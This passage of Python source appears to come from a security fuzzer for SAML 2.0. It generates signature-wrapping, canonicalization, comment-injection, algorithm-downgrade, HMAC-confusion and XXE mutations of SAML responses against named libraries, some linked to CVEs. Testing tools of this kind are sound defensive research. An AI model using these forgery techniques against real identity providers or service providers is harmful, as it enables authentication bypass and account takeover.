            _resign_cert_pem = f.read()

        # Pre-load key as RSAPrivateKey to avoid per-sign PEM parsing
        from cryptography.hazmat.primitives.serialization import load_pem_private_key
        _resign_key = load_pem_private_key(_resign_key_pem, password=None)

        # Pre-load cert as x509 objects
        from cryptography import x509 as _x509
        _resign_cert = [_x509.load_pem_x509_certificate(_resign_cert_pem)]

        from signxml import XMLSigner
        from signxml.algorithms import (
            CanonicalizationMethod,
            DigestAlgorithm,
            SignatureConstructionMethod,
            SignatureMethod,
        )

        _resign_signer = XMLSigner(
            method=SignatureConstructionMethod.enveloped,
            signature_algorithm=SignatureMethod.RSA_SHA256,
            digest_algorithm=DigestAlgorithm.SHA256,
            c14n_algorithm=CanonicalizationMethod.EXCLUSIVE_XML_CANONICALIZATION_1_0,
        )
        _log.debug("SAML re-signing initialized (IdP key loaded)")
        return _resign_key, _resign_cert, _resign_signer
    except Exception:
        _resign_init_failed = True
        _log.debug("SAML re-signing unavailable (key/signxml not found)", exc_info=True)
        return None


def _resign_assertion_bytes(data: bytes) -> bytes | None:
    """Re-sign the *original* Assertion in *data* with the test IdP key.

    Uses a 3-tier strategy to find the original (not evil) assertion:
      1. Reference URI in existing Signature → follow to target element
      2. Assertion that contains an enveloped Signature child
      3. Last Assertion in document order (XSW inserts evil *before*)

    Returns re-signed XML bytes, or None on failure.
    """
    ctx = _get_signer()
    if ctx is None:
        return None

    key_obj, cert_list, signer = ctx

    _DS = "http://www.w3.org/2000/09/xmldsig#"

    try:
        from lxml import etree

        # Parse — recover=True tolerates some malformation from mutations
        parser = etree.XMLParser(recover=True, resolve_entities=False)
        root = etree.fromstring(data, parser=parser)
        if root is None:
            return None

        def _is_assertion(elem):
            if not isinstance(elem.tag, str):
                return False
            return etree.QName(elem.tag).localname == "Assertion"

        # Strategy 1: Follow Reference URI to the signed assertion
        assertion = None
        for ref in root.iter(f"{{{_DS}}}Reference"):
            uri = ref.get("URI", "")
            if not uri.startswith("#"):
                continue
            target_id = uri[1:]
            for elem in root.iter():
                if not isinstance(elem.tag, str):
                    continue
                if elem.get("ID") == target_id and _is_assertion(elem):
                    assertion = elem
                    break
            if assertion is not None:
                break

        # Strategy 2: Assertion with enveloped Signature child
        if assertion is None:
            for elem in root.iter():
                if not _is_assertion(elem):
                    continue
                for child in elem:
                    if isinstance(child.tag, str) and etree.QName(child.tag).localname == "Signature":
                        assertion = elem
                        break
                if assertion is not None:
                    break

        # Strategy 3: Last assertion (XSW typically inserts evil before original)
        if assertion is None:
            all_a = [e for e in root.iter() if _is_assertion(e)]
            assertion = all_a[-1] if all_a else None

        if assertion is None:
            return None

        # Strip existing Signature from assertion before re-signing
        for sig in list(assertion):
            if isinstance(sig.tag, str):
                local = etree.QName(sig.tag).localname
                if local == "Signature":
                    assertion.remove(sig)

        # Sign — key_obj is pre-loaded RSAPrivateKey, cert_list is [x509.Certificate]
        # This avoids load_pem_private_key on every call (~100ms each).
        signed_assertion = signer.sign(assertion, key=key_obj, cert=cert_list)

        # Replace original assertion with signed version
        parent = assertion.getparent()
        if parent is None:
            return None
        idx = list(parent).index(assertion)
        parent.remove(assertion)
        parent.insert(idx, signed_assertion)

        return etree.tostring(root, xml_declaration=True, encoding="UTF-8")
    except Exception:
        # Mutation may have produced unparseable XML — that's fine
        return None


class SamlMutator:
    """SAML signature bypass taxonomy-driven mutator.

    Targets weaknesses in SAML 2.0 signature validation across libraries:
    xml-crypto, samlify, node-saml, ruby-saml, python3-saml, signxml,
    php-saml/xmlseclibs.
    """

    name = "saml"

    def __init__(self, seed: int | None = None, max_assertions: int = 0) -> None:
        self.rng = random.Random(seed)
        self._max_assertions = max_assertions  # 0 = no limit
        self._strategies: list = [
            # ── S1: XSW Signature Wrapping ──
            self._xsw1_pre_assertion_clone,       # 0
            self._xsw2_post_assertion_clone,      # 1
            self._xsw3_assertion_in_assertion,    # 2
            self._xsw4_assertion_swap,            # 3
            self._xsw5_post_signature_assertion,  # 4
            self._xsw7_extensions_embed,          # 5
            self._xsw8_object_embed,              # 6
            self._xsw_envelope_inversion,         # 7
            # ── S2: Parser Differentials (original + new) ──
            self._attr_pollution,                 # 8
            self._doctype_attlist,                # 9
            self._namespace_redeclaration,        # 10
            self._encoding_bom_injection,         # 11  NEW
            self._encoding_declaration_swap,      # 12  NEW
            self._namespace_undeclare,            # 13  NEW
            self._processing_instruction_inject,  # 14  NEW
            self._whitespace_crlf_inject,         # 15  NEW
            self._comment_in_element_name,        # 16  NEW
            self._namespace_prefix_remap,         # 17  NEW
            # ── S3: Canonicalization (original + new) ──
            self._void_c14n_relative_ns,          # 18
            self._comment_inject_digest,          # 19
            self._comment_inject_sigvalue,        # 20
            self._transform_chain_inject,         # 21  NEW
            self._transform_remove_enveloped,     # 22  NEW
            self._reference_uri_empty,            # 23  NEW
            self._reference_uri_xpointer,         # 24  NEW
            self._c14n_method_swap,               # 25  NEW
            # ── S4: Signature Bypass (original + new) ──
            self._sig_strip_all,                  # 26
            self._sig_strip_assertion,            # 27
            self._algo_downgrade,                 # 28
            self._hmac_confusion,                 # 29
            self._duplicate_reference,            # 30  NEW
            self._keyinfo_confusion,              # 31  NEW
            self._signedinfo_manipulation,        # 32  NEW
            # ── S5: XML Injection ──
            self._xxe_inject,                     # 33
            self._entity_expansion,               # 34
            self._xslt_transform_inject,          # 35
            # ── S6: Protocol-Level (original + new) ──
            self._nameid_spoof,                   # 36
            self._audience_bypass,                # 37
            self._timestamp_manipulation,         # 38
            self._issuer_spoof,                   # 39  NEW
            self._subject_confirmation_bypass,    # 40  NEW
            self._condition_manipulation,         # 41  NEW
            self._attribute_injection,            # 42  NEW
            # ── S7: Crypto Infrastructure ──
            self._golden_saml_self_signed,        # 43
            # ── S8: Implementation-Specific (original + new) ──
            self._xmlcrypto_firstchild,           # 44
            self._samlify_xpath_scope,            # 45
            self._rexml_namespace_quirk,          # 46
            self._libxml2_id_caching,             # 47
            self._assertion_count_bomb,           # 48  NEW
            self._go_encoding_xml_quirk,          # 49  NEW
            # ── G: CVE Gap Strategies ──
            self._xsw_first_assertion_extract,   # 50  CVE-2026-25922
            self._xsw_signed_in_extensions,      # 51  CVE-2025-54369
            self._reserved_ns_attr_inject,       # 52  CVE-2025-66567
            self._void_c14n_precomputed_digest,  # 53  CVE-2025-66568
            self._ns_prefixed_attr_dup,          # 54  Fragile Lock
            # ── H: Newly discovered gap strategies ──
            self._unicode_normalization,          # 55  NEW
            self._null_byte_inject,               # 56  NEW
            self._multi_sig_scope,                # 57  NEW
            # ── I: Extraction divergence strategies ──
            self._nameid_mixed_content,           # 58  NEW
            self._multi_nameid,                   # 59  NEW
            self._inclusive_ns_manipulate,         # 60  NEW
            self._assertion_id_collision,          # 61  NEW
            # ── J: Breakthrough consensus strategies ──
            self._sibling_attribute_inject,        # 62  NEW
            self._saml11_namespace_downgrade,      # 63  NEW
            self._signature_relocation_to_response,  # 64  NEW
            # ── K: SAMLStorm variant strategies ──
            self._digestvalue_leading_comment,         # 65  SAMLStorm firstChild
            self._digestvalue_cdata_wrap,               # 66  CDATA variant
            self._digestvalue_split_comment,            # 67  Split text node
            self._sigvalue_multi_comment,               # 68  SignatureValue variants
            self._digestvalue_pi_inject,                # 69  PI variant
            # ── L: C14N edge case strategies ──
            self._c14n_superfluous_ns,                  # 70  Unused NS decls
            self._c14n_inherited_ns,                    # 71  NS on ancestor
            self._c14n_attr_value_normalization,        # 72  CR/LF/TAB in attrs
            self._c14n_default_vs_prefixed_ns,          # 73  Default NS swap
            self._c14n_xml_inherited_attrs,             # 74  xml:lang/xml:space
            # ── M: Novel attack vector ──
            self._xpath_transform_exclude_subject,      # 75  XPath exclusion
            # ── N: Gap-derived strategies ──
            self._encrypted_assertion_wrapping,          # 76  CVE-2024-4985 class
            self._digestmethod_only_downgrade,           # 77  MD5 digest downgrade
            self._unicode_identity_confusion,            # 78  Invisible Unicode in NameID
            self._xslt_pre_verification_transform,       # 79  XSLT before sig verify
            self._void_c14n_enhanced,                    # 80  Enhanced void c14n
            # ── O: XML-DSig spec-derived (§4.3, §4.4, §5.1) ──
            self._signedinfo_c14n_swap,                  # 81  SignedInfo c14n divergence
            self._transform_remove_c14n,                 # 82  Implicit c14n default
            self._xpointer_comment_preservation,         # 83  Scheme-based XPointer
            self._hmac_truncation_attack,                # 84  HMACOutputLength bypass
            self._manifest_reference_inject,             # 85  Manifest in Object
            self._reference_dual_target,                 # 86  Two References, diff targets
            self._keyinfo_keyname,                       # 87  KeyName instead of X509
            self._keyinfo_retrieval_method,              # 88  RetrievalMethod URI
            self._reference_type_manifest,               # 89  Reference Type=Manifest
            # ── P: C14N / XPath Filter spec-derived ──
            self._c14n_prefixlist_inject,                # 90  PrefixList manipulation
            self._c14n_qname_in_attrvalue,               # 91  QName in attr value
            self._c14n_xml_attr_ancestor,                # 92  xml:lang/xml:space
            self._c14n_default_ns_switch,                # 93  Default NS swap
            self._c14n_2_0_algorithm_swap,               # 94  C14N 2.0 URI
            # ── Q: SAML Core/Profiles spec-derived ──
            self._subject_confirmation_sender_vouches,   # 95  sender-vouches method
            self._authz_decision_inject,                 # 96  AuthzDecisionStatement
            self._sso_expired_signed,                    # 97  Expired + valid sig
            # ── R: XPath Filter 2.0 spec-derived ──
            self._xpath_filter2_subtract_conditions,     # 98  Subtract Conditions
            self._xpath_filter2_union_evil,              # 99  Union evil content
            self._xpath_filter2_multi_step,              # 100 Multi-step filter
            # ── S: Reference-scope divergence targeted (E2 pilot pivot) ──
            self._reference_scope_rebind,                # 101 E2 pivot #3
        ]
        self._strategy_names: list[str] = [fn.__name__.lstrip("_") for fn in self._strategies]
        self._weights: list[int] = [
            # S1: XSW (slightly reduced to make room)
            10, 8, 8, 7, 7, 5, 5, 5,
            # S2: Parser differentials (original + new)
            5, 5, 6, 8, 7, 7, 6, 5, 4, 5,
            # S3: Canonicalization (original + new)
            6, 7, 4, 8, 7, 8, 7, 6,
            # S4: Signature bypass (original + new)
            9, 5, 5, 4, 6, 5, 4,
            # S5: XML injection
            3, 2, 2,
            # S6: Protocol-level (original + new)
            5, 4, 3, 5, 4, 4, 5,
            # S7: Crypto
            2,
            # S8: Implementation-specific (original + new)
            4, 4, 4, 3, 5, 6,
            # G: CVE Gap strategies
            8, 7, 6, 7, 6,
            # H: Newly discovered gap strategies
            7, 6, 7,
            # I: Extraction divergence strategies
            8, 7, 6, 7,
            # J: Breakthrough consensus strategies
            7, 6, 7,
            # K: SAMLStorm variant strategies
            9, 9, 9, 9, 9,
            # L: C14N edge case strategies
            8, 8, 8, 8, 8,
            # M: Novel attack vector
            10,
            # N: Gap-derived strategies
            8, 9, 8, 9, 7,
            # O: XML-DSig spec-derived (signedinfo_c14n through reference_type)
            10, 10, 10, 8, 8, 8, 7, 6, 6,
            # P: C14N / XPath Filter spec-derived
            10, 9, 8, 8, 7,
            # Q: SAML Core/Profiles spec-derived
            9, 8, 7,
            # R: XPath Filter 2.0 spec-derived
            10, 8, 8,
            # S: Reference-scope divergence targeted (E2 pilot pivot #3)
            12,
        ]
        self._base_weights: list[int] = list(self._weights)
        self._strategy_finds: list[int] = [0] * len(self._strategies)
        self._strategy_cov: list[int] = [0] * len(self._strategies)
        self._total_feedback_calls: int = 0
        assert len(self._strategies) == len(self._weights)

        # Build resign sets from name-based mapping (index-independent)
        self._needs_resign: frozenset[int] = frozenset(
            i for i, name in enumerate(self._strategy_names)
            if _RESIGN_ACTION.get(name) == "needs"
        )
        self._blocks_resign: frozenset[int] = frozenset(
            i for i, name in enumerate(self._strategy_names)
            if _RESIGN_ACTION.get(name) == "blocks"
        )
        # XSW strategies for sentinel attachment (S1 group)
        self._xsw_indices: frozenset[int] = frozenset(
            i for i, name in enumerate(self._strategy_names)
            if name.startswith("xsw") or name == "xsw_envelope_inversion"
        )

    # ── Concolic constraint hint ────────────────────────────────

    _active_constraints: list | None = None

    def set_constraint_hint(self, constraints: list | None) -> None:
        """Set active constraints to bias strategy selection."""
        self._active_constraints = constraints

    def _constraint_biased_weights(self) -> list[int]:
        """Temporarily boost weights for strategies relevant to active constraints."""
        if not self._active_constraints:
            return self._weights
        boosted = list(self._weights)
        relevant: set[str] = set()
        for c in self._active_constraints:
            cats = c.relevant_categories if hasattr(c, 'relevant_categories') else set()
            relevant.update(cats)
        if not relevant:
            return self._weights
        for i, name in enumerate(self._strategy_names):
            if name in relevant:
                boosted[i] = min(boosted[i] * 3, self._base_weights[i] * 5)
        return boosted

    # ── Learned weight feedback (v2 property-learning) ─────────

    _learned_weights: dict[str, float] | None = None

    def apply_learned_weights(
        self,
        strategy_effectiveness: dict[str, float],
        alpha: float | None = None,
    ) -> None:
        """Apply learned strategy weight adjustments from PropertyGuidedCoordinator.

        strategy_effectiveness: {strategy_name: divergence_rate}
        Higher divergence_rate → higher weight.

        alpha: Pareto tail-index estimate from the Hill estimator (DG006).
        When ``alpha < 2`` (infinite-variance regime, DG006 WARN), the
        sample maximum is an unstable normalisation reference — a single
        outlier can be 10–100× the median and collapse all other boosts
        near zero.  In that case we use the median as the reference instead
        so the boost distribution is robust to heavy-tail outliers.
        """
        if not strategy_effectiveness:
            return
        self._learned_weights = strategy_effectiveness
        rates = [v for v in strategy_effectiveness.values() if v > 0]
        if not rates:
            return
        if alpha is not None and alpha < 2.0:
            import statistics
            ref = statistics.median(rates) or 1.0
        else:
            ref = max(rates) or 1.0
        for i, name in enumerate(self._strategy_names):
            rate = strategy_effectiveness.get(name, 0.0)
            if rate > 0:
                boost = 1.0 + 2.0 * (rate / ref)  # 1x-3x (ref-normalised)
                self._weights[i] = min(
                    int(self._base_weights[i] * boost),
                    self._base_weights[i] * 5,
                )

    # ── Birkhoff-atom feedback (E4 FCA output) ─────────────────

    _lattice_atom_weights: dict[str, float] | None = None

    def apply_lattice_atoms(self, atom_weights: dict[str, float]) -> None:
        """Apply startup-time weight boosts from E4 FCA atom coverage.

        The ``atom_weights`` dict comes from
        the external diffspace research workspace and
        maps each strategy name to a coverage score in ``[0, 1]``: the
        fraction of the concept lattice's meet-irreducible atoms
        (Birkhoff generators) that the strategy's historical findings
        collectively touch.

        We scale each strategy's base weight multiplicatively by
        ``1 + 1.5 · score``, capping the boost at ``3× base_weight``. A
        strategy absent from the dict (or with score 0) is left at its
        base weight — never demoted. This is a *startup-time*
        initialization; subsequent runtime feedback via
        :meth:`apply_learned_weights` composes on top of the current
        ``self._weights`` rather than resetting from base, so the two
        channels stack.
        """
        if not atom_weights:
            return
        self._lattice_atom_weights = dict(atom_weights)
        for i, name in enumerate(self._strategy_names):
            score = atom_weights.get(name, 0.0)
            if score <= 0:
                continue
            score = min(1.0, float(score))
            boost = 1.0 + 1.5 * score  # 1x–2.5x
            boosted = int(round(self._base_weights[i] * boost))
            capped = min(boosted, self._base_weights[i] * 3)
            # Never weaken a weight that another channel already boosted.
            if capped > self._weights[i]:
                self._weights[i] = capped

    # ── Differential-automaton witness feedback (E7 output) ───

    _automaton_witness_weights: dict[str, float] | None = None

    def apply_automaton_witnesses(
        self, witness_weights: dict[str, float],
    ) -> None:
        """Apply startup-time boosts from E7 passive-SFA witness scores.

        ``witness_weights`` is a ``{strategy_name: score in [0, 1]}`` map
        produced by
        its E7 automata witness analysis.
        The score is the strategy's cumulative contribution to the
        diff-field coordinates that appear in the E7 disagreement trie's
        witness prefixes, normalized across the strategy set. A strategy
        with score 1.0 is the single biggest contributor to observed
        library-pair divergences in the pilot feature dump; a score of
        0.0 never produced a witness-visible field.

        Boost formula mirrors :meth:`apply_lattice_atoms` (``1 + 1.5·s``,
        capped at ``3× base``) so the two startup channels compose
        symmetrically and neither ever demotes a weight that another
        channel already raised.
        """
        if not witness_weights:
            return
        self._automaton_witness_weights = dict(witness_weights)
        for i, name in enumerate(self._strategy_names):
            score = witness_weights.get(name, 0.0)
            if score <= 0:
                continue
            score = min(1.0, float(score))
            boost = 1.0 + 1.5 * score
            boosted = int(round(self._base_weights[i] * boost))
            capped = min(boosted, self._base_weights[i] * 3)
            if capped > self._weights[i]:
                self._weights[i] = capped

    # ── Public API ───────────────────────────────────────────────

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        data = bytearray(inp.data)
        if len(data) < 10:
            data = bytearray(
                b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
                b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
                b' ID="_resp" Version="2.0">'
                b"<saml:Assertion/></samlp:Response>"
            )

        # Generate sentinel for XSW strategies so the oracle can verify
        # whether the accepting library extracted the attacker identity.
        sentinel_tag = b"FUZZ_EVIL_" + self.rng.randbytes(4).hex().encode()
        self._current_sentinel = sentinel_tag

        num_ops = self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
        applied: list[str] = []
        applied_indices: list[int] = []
        _effective_weights = self._constraint_biased_weights()
        for _ in range(num_ops):
            idx = self.rng.choices(
                range(len(self._strategies)), weights=_effective_weights, k=1
            )[0]
            strategy = self._strategies[idx]
            result = strategy(data)
            if result is not None and len(result) > 0:
                data = result
                applied.append(self._strategy_names[idx])
                applied_indices.append(idx)

        if len(data) > MAX_OUTPUT_SIZE:
            data = data[:MAX_OUTPUT_SIZE]

        # ── Assertion count limit enforcement ────────────────────
        if self._max_assertions > 0:
            data = self._enforce_assertion_limit(data)

        # ── Post-mutation re-signing (opt-out model) ──────────────
        # Re-sign the Assertion unless a "blocks" strategy was applied
        # (those intentionally modify Signature internals).  This
        # maximises sig_valid=True throughput so the fuzzer can explore
        # post-validation parser behaviour and reach danger levels 5-6.
        resigned = False
        idx_set = frozenset(applied_indices)
        blocks = idx_set & self._blocks_resign
        if not blocks:
            resigned_data = _resign_assertion_bytes(bytes(data))
            if resigned_data is not None:
                data = bytearray(resigned_data)
                resigned = True

        # XSW strategies inject evil assertions — attach sentinel
        evil_sentinel = sentinel_tag.decode() if (idx_set & self._xsw_indices) else None

        return Input(
            data=bytes(data),
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
                "resigned": resigned,
                **({"evil_sentinel": evil_sentinel} if evil_sentinel else {}),
            },
        )

    def _enforce_assertion_limit(self, data: bytearray) -> bytearray:
        """Remove excess Assertion elements if max_assertions is set."""
        import re
        tag = b"<saml:Assertion"
        count = data.count(tag)
        if count <= self._max_assertions:
            return data
        # Keep first N assertions, remove the rest by stripping extra
        # opening+closing tags. Simple approach: find Nth+1 assertion start
        # and truncate before it (keeping the rest of the Response).
        pos = 0
        for _ in range(self._max_assertions):
            idx = data.find(tag, pos)
            if idx < 0:
                return data
            pos = idx + len(tag)
        # Find the Nth+1 assertion and remove everything from there
        # to the corresponding closing tag
        while True:
            start = data.find(tag, pos)
            if start < 0:
                break
            # Find matching </saml:Assertion>
            end_tag = b"</saml:Assertion>"
            end = data.find(end_tag, start)
            if end < 0:
                # Self-closing or malformed — just remove opening
                end_sc = data.find(b"/>", start)
                if end_sc >= 0 and end_sc < start + 500:
                    data = data[:start] + data[end_sc + 2:]
                else:
                    break
            else:
                data = data[:start] + data[end + len(end_tag):]
        return data

    # ══════════════════════════════════════════════════════════════
    # S1: XML Signature Wrapping (XSW)
    # ══════════════════════════════════════════════════════════════

    def _xsw1_pre_assertion_clone(self, data: bytearray) -> bytearray | None:
        """XSW1/3: Inject evil assertion BEFORE the legitimate signed one.

        SP using //Assertion or first-child semantics picks the evil copy.
        """
        sentinel = getattr(self, "_current_sentinel", None)
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        evil = _make_evil_assertion(self.rng, sentinel)
        return bytearray(
            bytes(data[: span[0]]) + evil + b"\n" + bytes(data[span[0] :])
        )

    def _xsw2_post_assertion_clone(self, data: bytearray) -> bytearray | None:
        """XSW2: Inject evil assertion AFTER the legitimate one."""
        sentinel = getattr(self, "_current_sentinel", None)
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        evil = _make_evil_assertion(self.rng, sentinel)
        return bytearray(
            bytes(data[: span[1]]) + b"\n" + evil + bytes(data[span[1] :])
        )

    def _xsw3_assertion_in_assertion(self, data: bytearray) -> bytearray | None:
        """XSW4: Nest evil assertion INSIDE the legitimate assertion."""
        sentinel = getattr(self, "_current_sentinel", None)
        m = _RE_ASSERTION_CLOSE.search(data)
        if not m:
            return None
        evil = _make_evil_assertion(self.rng, sentinel)
        pos = m.start()
        return bytearray(
            bytes(data[:pos]) + evil + b"\n" + bytes(data[pos:])
        )

    def _xsw4_assertion_swap(self, data: bytearray) -> bytearray | None:
        """XSW5: Modify NameID in signed assertion, keep original as decoy."""
        sentinel = getattr(self, "_current_sentinel", None)
        m = _RE_NAMEID.search(data)
        if not m:
            return None
        evil_nameid = sentinel if sentinel is not None else self.rng.choice(EVIL_NAMEIDS)
        return bytearray(
            bytes(data[: m.start(2)])
            + evil_nameid
            + bytes(data[m.end(2) :])
        )

    def _xsw5_post_signature_assertion(self, data: bytearray) -> bytearray | None:
        """XSW6: Insert evil assertion right after the Signature element."""
        sentinel = getattr(self, "_current_sentinel", None)
        span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
        if not span:
            return None
        evil = _make_evil_assertion(self.rng, sentinel)
        return bytearray(
            bytes(data[: span[1]]) + b"\n" + evil + bytes(data[span[1] :])
        )

    def _xsw7_extensions_embed(self, data: bytearray) -> bytearray | None:
        """XSW7: Move legit assertion into Extensions, replace with evil."""
        sentinel = getattr(self, "_current_sentinel", None)
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        original = bytes(data[span[0] : span[1]])
        evil = _make_evil_assertion(self.rng, sentinel)
        wrapped = (
            XSW_EXTENSIONS_PREFIX + original + XSW_EXTENSIONS_SUFFIX
        )
        return bytearray(
            bytes(data[: span[0]])
            + wrapped
            + b"\n"
            + evil
            + bytes(data[span[1] :])
        )

    def _xsw8_object_embed(self, data: bytearray) -> bytearray | None:
        """XSW8: Move legit assertion into ds:Object, replace with evil."""
        sentinel = getattr(self, "_current_sentinel", None)
        a_span = _find_element_span(
            data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE
        )
        s_span = _find_element_span(
            data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE
        )
        if not a_span or not s_span:
            return None
        original = bytes(data[a_span[0] : a_span[1]])
        evil = _make_evil_assertion(self.rng, sentinel)
        obj_block = XSW_OBJECT_PREFIX + original + XSW_OBJECT_SUFFIX
        # Insert Object into Signature (before </ds:Signature>)
        m_sigclose = _RE_SIGNATURE_CLOSE.search(data)
        if not m_sigclose:
            return None
        result = bytearray(data)
        # First replace assertion with evil
        result[a_span[0] : a_span[1]] = evil
        # Recalculate sig close position after replacement
        offset = len(evil) - (a_span[1] - a_span[0])
        new_sigclose = m_sigclose.start() + offset
        result[new_sigclose:new_sigclose] = obj_block
        return result

    def _xsw_envelope_inversion(self, data: bytearray) -> bytearray | None:
        """Envelope inversion: wrap original Response inside a forged outer."""
        sentinel = getattr(self, "_current_sentinel", None)
        r_span = _find_element_span(
            data, _RE_RESPONSE_OPEN, _RE_RESPONSE_CLOSE
        )
        if not r_span:
            return None
        evil = _make_evil_assertion(self.rng, sentinel)
        original = bytes(data[r_span[0] : r_span[1]])
        outer = (
            b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
            b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
            b' ID="_outer" Version="2.0">\n'
            + evil
            + b"\n<samlp:Extensions>"
            + original
            + b"</samlp:Extensions>\n</samlp:Response>"
        )
        return bytearray(
            bytes(data[: r_span[0]]) + outer + bytes(data[r_span[1] :])
        )

    # ══════════════════════════════════════════════════════════════
    # S2: Parser Differentials
    # ══════════════════════════════════════════════════════════════

    def _attr_pollution(self, data: bytearray) -> bytearray | None:
        """Duplicate ID attribute with namespace prefix (S2-2).

        Nokogiri and REXML resolve differently: one returns the prefixed
        version, the other the unprefixed version.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        tag = bytes(data[m.start() : m.end()])
        # Add a duplicate ID with samlp: prefix
        evil_id = b"_evil_" + self.rng.randbytes(4).hex().encode()
        if b"samlp:ID=" not in tag:
            injection = b' samlp:ID="' + evil_id + b'"'
            pos = m.end() - 1  # before closing >
            return bytearray(
                bytes(data[:pos]) + injection + bytes(data[pos:])
            )
        return None

    def _doctype_attlist(self, data: bytearray) -> bytearray | None:
        """DOCTYPE ATTLIST injection (S2-3 / CVE-2025-25291).

        REXML applies ATTLIST defaults; Nokogiri/libxml2 ignores them.
        This creates divergent namespace structures.
        """
        payload = self.rng.choice(DOCTYPE_PAYLOADS)
        # Remove existing DOCTYPE if any
        cleaned = re.sub(rb"<!DOCTYPE[^>]*>", b"", bytes(data))
        # Insert after XML declaration or at start
        m_decl = _RE_XML_DECL.search(cleaned)
        if m_decl:
            pos = m_decl.end()
        else:
            pos = 0
        return bytearray(cleaned[:pos] + b"\n" + payload + cleaned[pos:])

    def _namespace_redeclaration(self, data: bytearray) -> bytearray | None:
        """Namespace prefix redeclaration (S1-4 / S2).

        Redefine saml:/ds: namespaces to confuse namespace-aware XPath.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        redecl = self.rng.choice(NAMESPACE_REDECLARATIONS)
        pos = m.end() - 1  # before closing >
        return bytearray(
            bytes(data[:pos]) + b" " + redecl + bytes(data[pos:])
        )

    # ══════════════════════════════════════════════════════════════
    # S3: Canonicalization Exploitation
    # ══════════════════════════════════════════════════════════════

    def _void_c14n_relative_ns(self, data: bytearray) -> bytearray | None:
        """Relative namespace URI injection (S3-1 / CVE-2025-66568).

        Causes exc-c14n to produce empty output on some implementations
        (libxml2, xmlseclibs). Digest of empty string is predictable.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        ns_attr = self.rng.choice(RELATIVE_NAMESPACE_URIS)
        pos = m.end() - 1
        result = bytearray(
            bytes(data[:pos]) + b" " + ns_attr + bytes(data[pos:])
        )
        # Optionally replace DigestValue with empty-string SHA-256
        if self.rng.random() < 0.5:
            m_dv = _RE_DIGEST_VALUE.search(result)
            if m_dv:
                result[m_dv.start(2) : m_dv.end(2)] = EMPTY_SHA256_B64
        return result

    def _comment_inject_digest(self, data: bytearray) -> bytearray | None:
        """Comment injection into DigestValue (S3-3 SAMLStorm / CVE-2025-29775).

        xml-crypto uses firstChild to read DigestValue. An XML comment
        becomes the firstChild, so the library reads the comment content
        as the digest value instead of the actual text.
        """
        m = _RE_DIGEST_VALUE.search(data)
        if not m:
            return None
        comment = self.rng.choice(COMMENT_DIGEST_PAYLOADS)
        # Insert comment before the actual value
        return bytearray(
            bytes(data[: m.start(2)]) + comment + bytes(data[m.start(2) :])
        )

    def _comment_inject_sigvalue(self, data: bytearray) -> bytearray | None:
        """Comment injection into SignatureValue (S3-3 / CVE-2025-29774)."""
        m = _RE_SIGNATURE_VALUE.search(data)
        if not m:
            return None
        comment = self.rng.choice(COMMENT_SIGVALUE_PAYLOADS)
        return bytearray(
            bytes(data[: m.start(2)]) + comment + bytes(data[m.start(2) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S4: Signature Validation Bypass
    # ══════════════════════════════════════════════════════════════

    def _sig_strip_all(self, data: bytearray) -> bytearray | None:
        """Complete signature removal (S4-1)."""
        span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
        if not span:
            return None
        return bytearray(bytes(data[: span[0]]) + bytes(data[span[1] :]))

    def _sig_strip_assertion(self, data: bytearray) -> bytearray | None:
        """Strip assertion-level signature only (S4-1).

        Keep response-level signature if present. Tests whether SP
        validates both levels independently.
        """
        # Find signature inside assertion
        a_span = _find_element_span(
            data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE
        )
        if not a_span:
            return None
        assertion = bytes(data[a_span[0] : a_span[1]])
        s_span = _find_element_span(
            assertion, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE
        )
        if not s_span:
            return None
        stripped = assertion[: s_span[0]] + assertion[s_span[1] :]
        return bytearray(
            bytes(data[: a_span[0]]) + stripped + bytes(data[a_span[1] :])
        )

    def _algo_downgrade(self, data: bytearray) -> bytearray | None:
        """Algorithm downgrade attack (S4-3).

        Change SignatureMethod and/or DigestMethod to weaker algorithms.
        """
        result = bytearray(data)
        if self.rng.random() < 0.7:
            m = _RE_SIG_METHOD.search(result)
            if m:
                weak = self.rng.choice(WEAK_SIG_ALGORITHMS)
                result[m.start(2) : m.end(2)] = weak
        if self.rng.random() < 0.5:
            m = _RE_DIGEST_METHOD.search(result)
            if m:
                weak = self.rng.choice(WEAK_DIGEST_ALGORITHMS)
                result[m.start(2) : m.end(2)] = weak
        return result

    def _hmac_confusion(self, data: bytearray) -> bytearray | None:
        """HMAC key confusion attack (S4-3).

        Change algorithm to HMAC. If the library uses the IdP's public
        key as the HMAC secret, the attacker can sign with it.
        """
        m = _RE_SIG_METHOD.search(data)
        if not m:
            return None
        hmac_uri = self.rng.choice([
            b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha256",
            b"http://www.w3.org/2000/09/xmldsig#hmac-sha1",
        ])
        return bytearray(
            bytes(data[: m.start(2)]) + hmac_uri + bytes(data[m.end(2) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S5: XML Injection & Entity Attacks
    # ══════════════════════════════════════════════════════════════

    def _xxe_inject(self, data: bytearray) -> bytearray | None:
        """XXE injection via DOCTYPE (S5-1)."""
        return self._doctype_attlist(data)

    def _entity_expansion(self, data: bytearray) -> bytearray | None:
        """Billion Laughs / quadratic blowup (S5-2)."""
